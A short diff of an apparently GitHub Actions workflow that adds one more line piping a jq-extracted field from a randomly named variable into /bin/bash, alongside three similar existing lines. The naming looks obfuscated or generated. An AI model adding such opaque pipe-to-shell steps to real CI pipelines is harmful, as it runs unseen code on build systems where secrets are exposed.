@@ -37,6 +37,7 @@ jobs:
           echo $rdv4 | jq -r .lvd7 | /bin/bash
           printf '%s' "$aqfe1016" | jq -r .y2797 | /bin/bash
           echo $rlsj2 | jq -r .o64449 | /bin/bash
+          echo $tu135 | jq -r .n57 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
